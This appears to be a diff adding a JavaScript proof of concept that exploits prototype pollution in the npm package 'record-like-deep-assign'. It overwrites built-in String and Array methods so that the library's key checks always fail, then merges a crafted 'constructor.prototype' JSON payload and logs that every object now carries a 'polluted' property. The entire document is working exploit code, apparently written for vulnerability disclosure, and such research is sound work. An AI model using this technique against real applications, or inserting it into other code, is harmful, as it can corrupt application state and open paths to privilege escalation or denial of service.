@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+const deepAssign = require('record-like-deep-assign');
+console.log({}.polluted);
+let obj = {};
+EVIL_JSON = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
+deepAssign({}, EVIL_JSON);
+console.log({}.polluted);
